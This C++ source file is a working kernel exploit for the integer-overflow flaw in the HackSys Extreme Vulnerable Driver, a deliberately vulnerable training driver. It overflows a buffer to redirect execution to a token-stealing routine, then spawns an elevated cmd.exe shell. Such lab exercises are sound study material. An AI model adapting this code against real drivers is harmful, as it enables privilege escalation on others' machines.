#include <Windows.h>
#include <stdio.h>

extern "C" VOID StealToken(void);

// Buffer size to be used: offset to RET + RET + terminator
#define SIZE 2088 + 4 + 4

// IOCTL to trigger the integer overflow vuln, copied from HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)

char* terminator = "\xB0\xB0\xD0\xBA";

int main()
{
	// Create handle to driver
	HANDLE device = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		return -1;
	}

	printf("[+] Opened handle to device: 0x%x\n", device);

	// Allocate memory to construct buffer for device
	char* uBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (uBuffer == NULL)
		return -2;

	printf("[+] User buffer allocated: 0x%x\n", uBuffer);

	// Constructing buffer
	RtlFillMemory(uBuffer, SIZE, 'A');

	// Overwriting EIP
	DWORD* payload_address = (DWORD*)(uBuffer + SIZE - 8);
	*payload_address = (DWORD)&StealToken;

	// Copying terminator value
	RtlCopyMemory(uBuffer + SIZE - 4, terminator, 4);

	DWORD bytesRet;

	if (DeviceIoControl(
		device,
		HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW,
		uBuffer,
		0xffffffff,
		NULL,
		0,
		&bytesRet,
		NULL
	))
	{
		printf("[+] Done! Enjoy a shell shortly.\n\n");
		system("cmd.exe");
	}
	else
		printf("[-] FUUUUUUUUUUUUU");
}